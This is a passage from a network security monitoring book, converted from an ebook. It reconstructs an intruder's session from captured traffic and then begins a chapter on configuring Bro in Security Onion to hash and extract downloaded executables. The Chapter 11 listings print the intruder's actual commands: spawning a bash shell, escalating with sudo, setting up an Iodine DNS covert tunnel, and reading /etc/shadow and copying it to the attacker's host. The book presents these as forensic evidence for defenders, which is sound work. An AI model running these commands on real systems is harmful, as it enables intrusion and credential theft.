<p class="calibre1">DST: ................core_channel_write....)....07078092619529470178701062926304........2...... </p>
<p class="calibre1">.6...4<b class="calibre3">python -c 'import pty;pty.spawn("/bin/bash")' </b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-19: Bash shell startup</i></p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">255</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p290"/>Continuing through the transcript reveals the reason for the Bash shell. </p>
<p class="calibre1">The intruder uses scp, as shown in Listing 11-20, to transfer (via SSH) the </p>
<p class="calibre1"> <i class="calibre4">iodine_0.6.0~rc1-7_i386.deb</i> package from 172.16.0.37 to 10.0.0.99 as user ubu32. </p>
<p class="calibre1">How does the intruder have the password to log in to 10.0.0.99? He prob-</p>
<p class="calibre1">ably captured it with his keylogger. </p>
<p class="calibre1">DST: ................core_channel_write....)....28332839019310295629231957979483........2...... </p>
<p class="calibre1">.=...4<b class="calibre3">scp</b> <b class="calibre3">iodine_0.6.0~rc1-7_i386.deb</b> <b class="calibre3">ubu32@10.0.0.99:/tmp</b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-20: Transfer of the </i> iodine_0 .6 .0~rc1-7_i386 .deb <i class="calibre4"> package</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Summarizing Stage 1</b></i></p>
<p class="calibre1">At this point, the intruder has taken several steps involving one victim sys-</p>
<p class="calibre1">tem, as summarized in Figure 11-17. He enticed a user to click a malicious </p>
<p class="calibre1">link posted to Twitter. That link pointed to a URL involving 203.0.113.15, </p>
<p class="calibre1">and the victim 172.16.0.37 visited a web server on the intruder’s system. </p>
<p class="calibre1">That malicious web server offered code that exploited a vulnerable Java </p>
<p class="calibre1">instance on 172.16.0.37. The payload delivered with the Java exploit caused </p>
<p class="calibre1">the victim to reach back again to 203.0.113.15 to retrieve more attack soft-</p>
<p class="calibre1">ware from the intruder. </p>
<p class="calibre1">1. Victim clicks on malicious URL on Twitter. </p>
<p class="calibre1">SOCIAL MEDIA OR OTHER COMMUNICATION</p>
<p class="calibre1">Victim</p>
<p class="calibre1">Twitter</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1">2. Victim web browser connects to </p>
<p class="calibre1">203.0.113.15:8080/healthcarenews. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">Victim</p>
<p class="calibre1">203.0.113.15</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1">3. Attack method exploits vulnerable Java </p>
<p class="calibre1">Exploited</p>
<p class="calibre1">software on victim system to execute code. </p>
<p class="calibre1">4. Malicious code causes victim to reach back to intruder</p>
<p class="calibre1">so intruder can retrieve more malicious software. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">Victim</p>
<p class="calibre1">203.0.113.15</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1"> <i class="calibre4">Figure 11-17: A summary of stage 1 of the client-side compromise</i></p>
<p class="calibre1"><b class="calibre3">256</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p291"/> <i class="calibre4"><b class="calibre3">Pivoting to a Second Victim</b></i></p>
<p class="calibre1">Next, as shown in Listing 11-21, it appears that the intruder is connecting </p>
<p class="calibre1">from the first victim, 172.16.0.37, via SSH as user ubu32 to a second victim, </p>
<p class="calibre1">10.0.0.99. This is followed by the login prompt on 10.0.0.99, another Linux </p>
<p class="calibre1">system that’s running the same kernel. It advertises itself as an Ubuntu </p>
<p class="calibre1">12.0.4.2 LTS distribution. </p>
<p class="calibre1">DST: ................core_channel_write....)....21495256091063571385331835436694........2...... </p>
<p class="calibre1">.....4<b class="calibre3">ssh ubu32@10.0.0.99</b></p>
<p class="calibre1">SRC: ..U...........2...........4<b class="calibre3">Welcome to Ubuntu 12.04.2 LTS</b> (GNU/Linux 3.5.0-25-generic i686) SRC:</p>
<p class="calibre1">SRC:  * Documentation:  https://help.ubuntu.com/</p>
<p class="calibre1">SRC:</p>
<p class="calibre1">SRC: 0 packages can be updated. </p>
<p class="calibre1">SRC: 0 updates are security updates. </p>
<p class="calibre1"> <i class="calibre4">Listing 11-21: Ubuntu connection to another victim</i></p>
<p class="calibre1">By running sudo bash, as shown in Listing 11-22, the intruder escalates </p>
<p class="calibre1">his access to root privileges. </p>
<p class="calibre1">DST: ...v............core_channel_write....)....29459743353766825927232004106327........2...... </p>
<p class="calibre1">.....4sudo bash</p>
<p class="calibre1">DST: ........... </p>
<p class="calibre1">DST:</p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....29459743353766825927232004106327............ </p>
<p class="calibre1">SRC: ............ </p>
<p class="calibre1">SRC: ...w...........2...........4<b class="calibre3">sudo bash</b></p>
<p class="calibre1">SRC: ....................core_channel_write....)....UJUHVDEWIYIKWPCUMRTWODZUIDRXEMKG. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2.......#...4[sudo] password for ubu32: ....................core_channel_</p>
<p class="calibre1">write....)....JTCKKYYZSXEFTWGOEWDZKWHCOLJYUWZG. </p>
<p class="calibre1">DST: ...v............core_channel_write....)....56755805437825017718244048581240........2...... </p>
<p class="calibre1">.....4wonderubu</p>
<p class="calibre1"> <i class="calibre4">Listing 11-22: Access escalation with sudo bash</i></p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Instal ing a Covert Tunnel</b></i></p>
<p class="calibre1">As root, the intruder now installs the Iodine DNS covert tunnel tool via </p>
<p class="calibre1">dpkg -i iodine_0.6.0~rc1-7_i386.deb, as shown in Listing 11-23. </p>
<p class="calibre1">DST: ................core_channel_write....)....64642638366982677090891088802167........2...... </p>
<p class="calibre1">.,...4<b class="calibre3">dpkg -i iodine_0.6.0~rc1-7_i386.deb</b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-23: Iodine DNS covert tunnel tool instal ation</i></p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">257</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p292"/>Next, we see that the intruder starts the Iodine tool with the command iodine -r 203.0.113.8 practicalnsm.com, as shown in Listing 11-24. He is starting the Iodine client, pointing it to a server at 203.0.113.8, with DNS traffic </p>
<p class="calibre1">using the  <i class="calibre4">practicalnsm.com</i> domain. (I wonder who caused this intrusion?) </p>
<p class="calibre1">Because the attacker initiates Iodine in this manner, it looks like the victim, </p>
<p class="calibre1">10.0.0.99, will communicate directly with an Iodine server at 203.0.113.8. </p>
<p class="calibre1">(There is no need to communicate with a DNS server when Iodine is run in </p>
<p class="calibre1">this manner, but the covert traffic will still appear as DNS.)</p>
<p class="calibre1">DST: ................core_channel_write....)....54112282595894012391779534721588........2...... </p>
<p class="calibre1">./...4<b class="calibre3">iodine -r</b> <b class="calibre3">203.0.113.8 practicalnsm.com</b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-24: Iodine tool startup</i></p>
<p class="calibre1">Listing 11-25 likely shows output received from the Iodine server. We </p>
<p class="calibre1">see that the server IP address is 10.10.0.1, which tells us that there is a VPN </p>
<p class="calibre1">sort of channel between 10.0.0.99 and 203.0.113.8. Now the two computers </p>
<p class="calibre1">can communicate with each other via IP addresses like 10.10.0.1 for the </p>
<p class="calibre1">server, rather than 203.0.113.8. (The Iodine tool encapsulates the intruder’s </p>
<p class="calibre1">communications in DNS traffic.)</p>
<p class="calibre1">SRC: ....................core_channel_write....).... </p>
<p class="calibre1">WXQSRQPTXGMIWNZFNDHOHWTCFEJDDKUF................2.......:...4<b class="calibre3">Server tunnel IP is 10.10.0.1</b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-25: Output from the Iodine server</i></p>
<p class="calibre1">To test connectivity, the intruder uses the ping utility to contact 10.10.0.1, </p>
<p class="calibre1">the IP address at the other end of the tunnel, as shown in Listing 11-26. The </p>
<p class="calibre1">remote system replies, and the tunnel is working. An NSM sensor will not </p>
<p class="calibre1">see ICMP traffic, but it will start seeing odd DNS activity. </p>
<p class="calibre1">SRC: ...............2...........4<b class="calibre3">ping -c</b> 3 <b class="calibre3">10.10.0.1</b></p>
<p class="calibre1">SRC: ....................core_channel_write....)....BGCEPMSGLBOFCPOHKXSKOAMVWVCRDKFU. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2.......:...4<b class="calibre3">PING 10.10.0.1 (10.10.0.1) 56(84) bytes of data. </b></p>
<p class="calibre1">SRC: ...........2........core_channel_write....)....GSFTPZWPJXAREZEXEEALKFUBCUSRLPEK. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=1 ttl=64 time=2.07 ms SRC: ...........9........core_channel_write....)....MUNJGYKCWWYETWKFZOWTIVKVAQNLKNCQ. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=2 ttl=64 time=1.15 ms SRC: ...........9........core_channel_write....)....JLCWSBHPCCBTZFUVTJUYBYQVUOXEZPPF. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..Q...........2...........464 bytes from 10.10.0.1: icmp_req=3 ttl=64 time=1.12 ms SRC:</p>
<p class="calibre1">SRC: --- 10.10.0.1 ping statistics ---</p>
<p class="calibre1">SRC: 3 packets transmitted, 3 received, 0% packet loss, time 2003ms</p>
<p class="calibre1">SRC: rtt min/avg/max/mdev = 1.128/1.453/2.073/0.439 ms</p>
<p class="calibre1"> <i class="calibre4">Listing 11-26: Ping test for tunnel connectivity</i></p>
<p class="calibre1"><b class="calibre3">258</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p293"/> <i class="calibre4"><b class="calibre3">Enumerating the Victim</b></i></p>
<p class="calibre1">Now the intruder turns to enumerating the victim. He prints the output of </p>
<p class="calibre1">the  <i class="calibre4">/etc/shadow</i> file, which contains password hashes. Listing 11-27 shows </p>
<p class="calibre1">part of this file. </p>
<p class="calibre1">SRC: root@intubu32:~# ....................core_channel_write....).... </p>
<p class="calibre1">LBTPOVHNRBVNFEXWLPWAAXXSYKEYJQMW. </p>
<p class="calibre1">DST: ...|............core_channel_write....)....76703429583552950498014447957238........2...... </p>
<p class="calibre1">.....4<b class="calibre3">cat /etc/shadow</b></p>
<p class="calibre1">DST: ............ </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..d............core_channel_write....)....76703429583552950498014447957238............... </p>
<p class="calibre1">.......... </p>
<p class="calibre1">SRC: ...............2...........4cat /etc/shadow</p>
<p class="calibre1">SRC: root:!:15773:0:99999:7:::</p>
<p class="calibre1">SRC: daemon:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: bin:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: sys:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: sync:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: games:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: man:*:15749:0:99999:7:::</p>
<p class="calibre1">SRC: lp:*:15749:0:99999:7:::</p>
<p class="calibre1"> <i class="calibre4">Listing 11-27: Contents of the </i>/etc/shadow <i class="calibre4"> file</i></p>
<p class="calibre1">As shown in Listing 11-28, the intruder uses scp to copy the  <i class="calibre4">/etc/shadow</i> </p>
<p class="calibre1">file to 10.10.0.1, the server on the other side of the Iodine covert channel. </p>
<p class="calibre1">He connects as user raybourque and copies the file to Ray’s home directory. </p>
<p class="calibre1">His password is Bru1ns. I like this guy. (Note that by using scp, the transfer is </p>
<p class="calibre1">encrypted within the DNS covert channel.)</p>
<p class="calibre1">SRC: ..............2.......@...4<b class="calibre3">scp /etc/shadow raybourque@10.10.0.1:/home/raybourque/</b></p>
<p class="calibre1">DST: ...s............core_channel_write....)....12979532812626493965961252667084........2...... </p>
<p class="calibre1">.....4<b class="calibre3">Bru1ns</b></p>
<p class="calibre1">SRC: <b class="calibre3">shadow</b>                                        100% 1121     1.1KB/s   00:00</p>
<p class="calibre1"> <i class="calibre4">Listing 11-28: Copying the </i>/etc/shadow <i class="calibre4"> file</i></p>
<p class="calibre1">The intruder next creates a recursive directory listing of the entire hard </p>
<p class="calibre1">drive and puts the contents in a file titled  <i class="calibre4">intubu32.ls-alR.txt</i>, as shown in Listing 11-29. </p>
<p class="calibre1">DST: ................core_channel_write....)....67917540968083609031577076644751........2.... </p>
<p class="calibre1">...(...4<b class="calibre3">ls -alR / &gt; intubu32.ls-alR.txt</b></p>
<p class="calibre1"> <i class="calibre4">Listing 11-29: Creating a recursive directory listing of the hard drive </i></p>
<p class="calibre1">After creating the file, the intruder again uses scp to transfer it to his </p>
<p class="calibre1">server as user raybourque, as shown in Listing 11-30. </p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">259</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p294"/>SRC: ..............2...........4<b class="calibre3">scp intubu32.ls-alR.txt raybourque@10.10.0.1:/home/raybourque</b> <b class="calibre3">SRC: &lt;32.ls-alR.txt</b> raybourque@10.10.0.1:/home/raybourque                         </p>
<p class="calibre1">........................./</p>
<p class="calibre1">SRC: ....................core_channel_write....)....USSCEEVDBIGFIRWOSESCHCUWSDAZFPJS. </p>
<p class="calibre1">SRC: . </p>
<p class="calibre1">SRC: ..u...........2...........4Password:....................core_channel_write....).... </p>
<p class="calibre1">GUTYMDXFGXQWFPYSCFKMNPZTQEKYHWYC. </p>
<p class="calibre1">DST: ...s............core_channel_write....)....56606769242836968330355877691782........2...... </p>
<p class="calibre1">.....4Bru1ns</p>
<p class="calibre1"> <i class="calibre4">Listing 11-30: Transfer of hard drive file listing to intruder’s server</i></p>
<p class="calibre1">That’s the end of the transcript. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Summarizing Stage 2</b></i></p>
<p class="calibre1">In the second half of this intrusion, the intruder, still operating from </p>
<p class="calibre1">203.0.113.15, used stolen credentials to connect via SSH from 172.16.0.37 </p>
<p class="calibre1">to 10.0.0.9. He copied a DNS covert tunnel tool to the second victim and </p>
<p class="calibre1">configured it to speak to a new intruder system at 203.0.113.8. The intruder </p>
<p class="calibre1">activated the covert tunnel, and we saw that it communicated via DNS </p>
<p class="calibre1">requests and replies. Within the covert tunnel, the intruder copied sensitive </p>
<p class="calibre1">data enumerated from the second victim, 10.0.0.9. Figure 11-18 summarizes </p>
<p class="calibre1">these actions. </p>
<p class="calibre1">1. Intruder pivots from Victim 1 to Victim 2. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 1</p>
<p class="calibre1">Victim 1</p>
<p class="calibre1">203.0.113.15</p>
<p class="calibre1">172.16.0.37</p>
<p class="calibre1">Victim 2</p>
<p class="calibre1">10.0.0.99</p>
<p class="calibre1">2. Intruder installs DNS covert tunnel tool and creates </p>
<p class="calibre1">channel to second intruder system (Intruder 2). </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">Victim 2</p>
<p class="calibre1">203.0.113.8</p>
<p class="calibre1">10.0.0.99</p>
<p class="calibre1">3. Within covert tunnel, intruder copies sensitive </p>
<p class="calibre1">data from Victim 2 to Intruder 2. </p>
<p class="calibre1">NETWORK CONNECTION</p>
<p class="calibre1">Intruder 2</p>
<p class="calibre1">Victim 2</p>
<p class="calibre1">203.0.113.8</p>
<p class="calibre1">10.0.0.99</p>
<p class="calibre1"> <i class="calibre4">Figure 11-18: A summary of stage 2 of the server-side compromise</i></p>
<p class="calibre1"><b class="calibre3">260</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p295"/><img src="index-295_1.jpg" alt="Image 145" class="calibre2"/></p>
<p class="calibre1"><b class="calibre3">conclusion</b></p>
<p class="calibre1">Our review of this chapter’s example showed that the intruder was very </p>
<p class="calibre1">active on the original victim, 172.16.0.37, and used information gathered </p>
<p class="calibre1">from that system to pivot to 10.0.0.99. The initial review of NSM data out-</p>
<p class="calibre1">lined the broad story of the intrusion, but examining the command-and-</p>
<p class="calibre1">control channel helped fill in some blanks. Thanks to the NSM platform </p>
<p class="calibre1">capturing full packet data, the Vivian’s Pets CIRT knows what happened </p>
<p class="calibre1">to the two systems on its network. </p>
<p class="calibre1">This example of a client-side compromise began with an innocent </p>
<p class="calibre1">search on Twitter and concluded with two compromised machines and a </p>
<p class="calibre1">covert channel carrying sensitive information outside the company. Our </p>
<p class="calibre1">network-centric approach answered many questions about the course of the </p>
<p class="calibre1">intrusion, but it also showed that in some ways, the CIRT got lucky. If the </p>
<p class="calibre1">command-and-control channel between 203.0.113.15 and 172.16.0.37 had </p>
<p class="calibre1">been encrypted, the CIRT would not have learned critical details about </p>
<p class="calibre1">the intrusion. For that reason, it’s useful to have host-centric forensics and </p>
<p class="calibre1">investigation techniques ready if possible, but that’s a topic for someone </p>
<p class="calibre1">else’s book! </p>
<p class="calibre1">Speaking of Twitter, the analysts do have some information about </p>
<p class="calibre1">the source of the attack. Threat agents are humans who might make bad </p>
<p class="calibre1">choices. Defenders can sometimes capitalize on these bad choices to better </p>
<p class="calibre1">understand the threat and defend the network. In the case of this intrusion, </p>
<p class="calibre1">several hours after the covert channel died, the tweet shown in Figure 11-19 </p>
<p class="calibre1">appeared. Pay attention to the bottom of the figure where the tweet’s text </p>
<p class="calibre1">appears. </p>
<p class="calibre1"> <i class="calibre4">Figure 11-19: Last tweet from </i> Callbackpnsm</p>
<p class="calibre1">Client-side Compromise   <b class="calibre3">261</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p296"/>This tweet is a combination of text and a picture. The tweet says  </p>
<p class="calibre1">“@ubu32pnsm Thanks for checking out the healthcare update. One of </p>
<p class="calibre1">us is #winning. pic.twitter.com/mD4y6eIiqF.” The picture, shown in Fig-</p>
<p class="calibre1">ure 11-19, appears to be a screen capture of an Ubuntu desktop; in fact, it </p>
<p class="calibre1">shows the victim user’s system. She is logged in to Twitter as user Ubu32pnsm. </p>
<p class="calibre1">Two Firefox browser tabs are open. The second tab shows part of the URL </p>
<p class="calibre1">for the phony  <i class="calibre4">healthcarenews</i> website on 203.0.113.15. This intruder thinks </p>
<p class="calibre1">he’s a funny guy, but personalized messages like this could be his undoing. </p>
<p class="calibre1">In order to not get caught, attackers also need to practice sound opera-</p>
<p class="calibre1">tional security. </p>
<p class="calibre1"><b class="calibre3">262</b>   Chapter 11</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p297"/><b class="calibre3">12</b></p>
<p class="calibre1"><b class="calibre3">e x T e N D i N g   S o</b></p>
<p class="calibre1">So far, we’ve been working with the default </p>
<p class="calibre1">installation of SO. This chapter introduces </p>
<p class="calibre1">a few ways to extend it. You just need to edit </p>
<p class="calibre1">a few configuration files and download some </p>
<p class="calibre1">external content to get more from your SO setup. </p>
<p class="calibre1">To move beyond the “stock” SO installation, we’ll look at three ways to </p>
<p class="calibre1">leverage additional functionality provided by the Bro suite: </p>
<p class="calibre1">•  Use the MD5 hashes logged by Bro with the website VirusTotal or other </p>
<p class="calibre1">third-party analysis engines. </p>
<p class="calibre1">•  Configure Bro to extract binaries from network traffic, so that you can </p>
<p class="calibre1">submit those artifacts to third-party analysis engines. </p>
<p class="calibre1">•  Integrate external intelligence from Mandiant’s APT1 report with Bro </p>
<p class="calibre1">to generate alert data. </p>
<p class="calibre1">The chapter concludes with an example that shows how SO reports and </p>
<p class="calibre1">extracts the download of a malicious binary. </p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p298"/><b class="calibre3">using bro to Track executables</b></p>
<p class="calibre1">When trying to defend an enterprise, CIRTs can benefit by knowing which </p>
<p class="calibre1">executables users are downloading over the network. Usually, these exe-</p>
<p class="calibre1">cutables are benign tools or packages that people need to do their jobs, but </p>
<p class="calibre1">sometimes they’re malicious software. Bro can help you to discover the sorts </p>
<p class="calibre1">of executables people are downloading in order to protect them from harm. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Hashing Downloaded Executables with Bro</b></i></p>
<p class="calibre1">By default, the version of Bro shipped with SO calculates an MD5 hash (a </p>
<p class="calibre1">cryptographic representation of a file’s contents) for every executable down-</p>
<p class="calibre1">loaded via HTTP. These hash values can help us track the executables </p>
<p class="calibre1">downloaded by users. For example, Listing 12-1 shows how Bro tracks execut-</p>
<p class="calibre1">able downloads. The  <i class="calibre4">notice.log</i> file records data about hashes that Bro gener-</p>
<p class="calibre1">ates when it sees executables transferred over HTTP. </p>
<p class="calibre1">2013-04-12T13:33:47+0000        mBNkJTlLBfa     192.168.2.108   49630   23.62.236.50    80      </p>
<p class="calibre1">1       GET     download.cdn.mozilla.net        /pub/mozilla.org/firefox/releases/20.0.1/</p>
<p class="calibre1">win32/en-US/Firefox Setup 20.0.1.exeu   http://www.mozilla.org/en-US/products/download. </p>
<p class="calibre1">html?product=firefox-20.0&amp;os=win&amp;lang=en-US   Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0        0       21036128        200     OK      -       -       </p>
<p class="calibre1">-       (empty) -   --       application/x-dosexecv   1e39efe30b02fd96b10785b49e23913bw        </p>
<p class="calibre1">-</p>
<p class="calibre1"> <i class="calibre4">Listing 12-1: Bro </i> http .log <i class="calibre4"> entry for download of Firefox binary</i></p>
<p class="calibre1">You can see the download of  <i class="calibre4">Firefox Setup 20.0.1.exe</i> u, a file of type </p>
<p class="calibre1">application/x-dosexec v, with the hash 1e39efe30b02fd96b10785b49e23913b w. </p>
<p class="calibre1">By default, Bro reports when it hashes executables and writes an event to </p>
<p class="calibre1">the Bro  <i class="calibre4">notice.log</i> file, as shown in Listing 12-2. </p>
<p class="calibre1">2013-04-12T13:34:01+0000        mBNkJTlLBfa     192.168.2.108   49630   23.62.236.50    </p>
<p class="calibre1">80      tcp     HTTP::MD5v       192.168.2.108 1e39efe30b02fd96b10785b49e23913b http://</p>
<p class="calibre1">download.cdn.mozilla.net/pub/mozilla.org/firefox/releases/20.0.1/win32/en-US/Firefox </p>
<p class="calibre1">Setup 20.0.1.exeu  1e39efe30b02fd96b10785b49e23913bw       192.168.2.108   23.62.236.50    </p>
<p class="calibre1">80      -       sov-eth0-1      Notice::ACTION_LOG      6       3600.000000     F       </p>
<p class="calibre1">-       -       -       -       -   --       -</p>
<p class="calibre1"> <i class="calibre4">Listing 12-2: Bro </i> notice .log <i class="calibre4"> entry for MD5 calculation</i></p>
<p class="calibre1">Here, you see the download of  <i class="calibre4">Firefox Setup 20.0.1.exe</i> u, with Bro’s rec-</p>
<p class="calibre1">ognition that this is an HTTP and requires MD5 hashing v and a match-</p>
<p class="calibre1">ing hash 1e39efe30b02fd96b10785b49e23913b w. You can use third-party sources </p>
<p class="calibre1">with the hash to get more information about this download. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Submitting a Hash to VirusTotal</b></i></p>
<p class="calibre1">VirusTotal ( <i class="calibre4">http://www.virustotal.com/</i>) is a popular online resource for </p>
<p class="calibre1">learning more about binaries. In addition to submitting actual files, users </p>
<p class="calibre1">can also submit hashes of binaries to VirusTotal to see if those hashes are </p>
<p class="calibre1"><b class="calibre3">264</b>   Chapter 12</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p299"/><img src="index-299_1.png" alt="Image 146" class="calibre2"/></p>
<p class="calibre1"><img src="index-299_2.png" alt="Image 147" class="calibre2"/></p>
<p class="calibre1">present in the VirusTotal database. If a previous user has already uploaded </p>
<p class="calibre1">a binary with the same hash to VirusTotal, a search for that hash should </p>
<p class="calibre1">reveal what VirusTotal knows about the binary submitted earlier. </p>
<p class="calibre1">To see this functionality at work, we’ll submit the hash logged by Bro </p>
<p class="calibre1">from Listing 12-1, as shown in Figure 12-1. </p>
<p class="calibre1"> <i class="calibre4">Figure 12-1: Submit ing the observed MD5 hash to VirusTotal</i></p>
<p class="calibre1">Within a few seconds, we see results like those shown in Figure 12-2. </p>
<p class="calibre1"> <i class="calibre4">Figure 12-2: VirusTotal results for the submit ed MD5 hash</i></p>
<p class="calibre1">VirusTotal has a match for this hash (notice the four angels), and no </p>
<p class="calibre1">antivirus engines have detected the binary as malicious, as shown in the </p>
<p class="calibre1">Detection Ratio field. </p>
<p class="calibre1">The Additional Information tab offers more data on the binaries that </p>
<p class="calibre1">VirusTotal has seen with the matching MD5 hash, as shown in Listing 12-3. </p>
<p class="calibre1">First seen by VirusTotal</p>
<p class="calibre1">2013-04-10 22:10:23 UTC ( 6 days, 20 hours ago )</p>
<p class="calibre1">Last seen by VirusTotal</p>
<p class="calibre1">2013-04-17 15:29:15 UTC ( 3 hours, 8 minutes ago )</p>
<p class="calibre1">File names (max. 25)</p>
<p class="calibre1"><b class="calibre3">Firefox_Setup_20.0.1.exe</b></p>
<p class="calibre1"><b class="calibre3">Firefox Setup 20.0.1.exe</b></p>
<p class="calibre1">Extending SO   <b class="calibre3">265</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p300"/>test.exe</p>
<p class="calibre1">7zS.sfx.exe</p>
<p class="calibre1">Firefox_Setup_20.0.1GB32.exe</p>
<p class="calibre1">TtfjHao4.exe.part</p>
<p class="calibre1"><b class="calibre3">Firefox_Setup_20.0.1.exe</b></p>
<p class="calibre1">7zS.sfx</p>
<p class="calibre1">file-5362262_exe</p>
<p class="calibre1">Firefox%20Setup%2020.0.1.exe</p>
<p class="calibre1"> <i class="calibre4">Listing 12-3: First seen, last seen, and filename information from VirusTotal</i></p>
<p class="calibre1">As highlighted in bold, names referencing Firefox setup ( <i class="calibre4">Firefox_</i></p>
<p class="calibre1"> <i class="calibre4">Setup_20.0.1.exe</i>) are the same as the binary we observed in our Bro logs, </p>
<p class="calibre1">but others, like file-5362262_exe, are completely different. </p>
<p class="calibre1">This analysis is helpful, but not conclusive. It would be better to have </p>
<p class="calibre1">copies of the binaries themselves, not just their hashes. We could do more </p>
<p class="calibre1">analysis with the original artifacts. </p>
<p class="calibre1"><b class="calibre3">using bro to extract binaries from Traffic</b></p>
<p class="calibre1">By default, Bro with SO logs MD5 hashes of binaries downloaded over </p>
<p class="calibre1">HTTP, but it does not extract the binaries and save them to disk. It’s easy </p>
<p class="calibre1">to configure Bro to take these actions, however, but we do need to be care-</p>
<p class="calibre1">ful not to overwhelm the sensor with the extracted binaries. To reduce that </p>
<p class="calibre1">potential problem, we’ll tell Bro to extract Windows executables downloaded </p>
<p class="calibre1">over HTTP and FTP only. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Configuring Bro to Extract Binaries from Traffic</b></i></p>
<p class="calibre1">Bro inspects traffic and generates logs based on the  <i class="calibre4">policy scripts</i> that ship with the default installation. Policy scripts are the ways analysts use the  <i class="calibre4">Bro </i></p>
<p class="calibre1"> <i class="calibre4">network programming language</i> (a term popularized by Liam Randall) to tell </p>
<p class="calibre1">the Bro engine what to do with the traffic it sees. </p>
<p class="calibre1">Bro reports what it finds using logfiles and messages that it creates </p>
<p class="calibre1">using its  <i class="calibre4">notice framework</i>. (You’re encouraged to leave the default scripts </p>
<p class="calibre1">alone, and to make changes to the policy scripts found in the  <i class="calibre4">/opt/bro/share/</i></p>
<p class="calibre1"> <i class="calibre4">bro/site/</i> directory.)</p>
<p class="calibre1">To reconfigure Bro to extract Windows executables downloaded over </p>
<p class="calibre1">HTTP and FTP, we start by creating a place to store extracted content with </p>
<p class="calibre1">this command:</p>
<p class="calibre1">$ <b class="calibre3">sudo mkdir -p /nsm/bro/extracted/http/ /nsm/bro/extracted/ftp/</b></p>
<p class="calibre1">Next, we create a copy of the  <i class="calibre4">local.bro</i> policy script for safekeeping. </p>
<p class="calibre1">$ <b class="calibre3">sudo cp /opt/bro/share/bro/site/local.bro</b> <b class="calibre3">/opt/bro/share/bro/site/local.bro.orig</b> <b class="calibre3">266</b>   Chapter 12</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p301"/>Now we edit the  <i class="calibre4">local.bro</i> file. (I’m using the vi editor, but use any editor you like, such as the Leafpad program bundled with SO.)</p>
<p class="calibre1">$ <b class="calibre3">sudo vi /opt/bro/share/bro/site/local.bro</b></p>
<p class="calibre1">Listing 12-4 shows the content to add at the very bottom of the  <i class="calibre4">local.bro</i> file. </p>
<p class="calibre1"># Extract EXEs</p>
<p class="calibre1">redef HTTP::extract_file_types += /application\/x-dosexec/;u</p>
<p class="calibre1">redef FTP::extract_file_types += /application\/x-dosexec/;v</p>
<p class="calibre1"># Extract files to /nsm/bro/extracted/</p>
<p class="calibre1">redef HTTP::extraction_prefix = "/nsm/bro/extracted/http/http-item"; </p>
<p class="calibre1">redef FTP::extraction_prefix = "/nsm/bro/extracted/ftp/ftp-file"; </p>
<p class="calibre1"> <i class="calibre4">Listing 12-4: Additions to the end of the </i> local .bro <i class="calibre4"> file that enable Windows executable</i> <i class="calibre4">extraction for HTTP and FTP</i></p>
<p class="calibre1">If you wanted Bro to extract executables from Simple Mail Transfer </p>
<p class="calibre1">Protocol (SMTP) as well, you could add more lines similar to those in </p>
